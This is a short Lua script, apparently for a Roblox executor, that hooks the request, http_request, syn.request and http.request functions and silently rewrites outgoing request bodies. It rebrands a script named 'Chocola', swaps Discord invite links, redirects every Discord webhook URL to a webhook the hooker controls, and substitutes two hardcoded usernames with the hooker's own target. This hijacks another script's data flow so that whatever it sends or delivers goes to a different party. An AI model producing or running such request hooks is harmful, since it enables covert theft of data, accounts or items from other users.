if _REQ then
    local _orig = _REQ
    local function _hooked(args)
        if args and args.Body and type(args.Body) == 'string' then
            args.Body = args.Body:gsub('[Cc][Hh][Oo][Cc][Oo][Ll][Aa]', 'GHOST MOREIRA')
            args.Body = args.Body:gsub('discord%.gg/[%w]+', 'discord.gg/t82eh7bgY')
            args.Body = args.Body:gsub('https://discord%.com/api/webhooks/[%w_%-/]+', function() return getgenv().GHOST_WEBHOOK end)
            args.Body = args.Body:gsub('NEDYXSTOCK19', function() return getgenv().GHOST_TARGET end)
            args.Body = args.Body:gsub('said123ca', function() return getgenv().GHOST_TARGET end)
        end
        return _orig(args)
    end
    pcall(function() request = _hooked end)
    pcall(function() http_request = _hooked end)
    pcall(function() if syn then syn.request = _hooked end end)
    pcall(function() if http then http.request = _hooked end end)
end

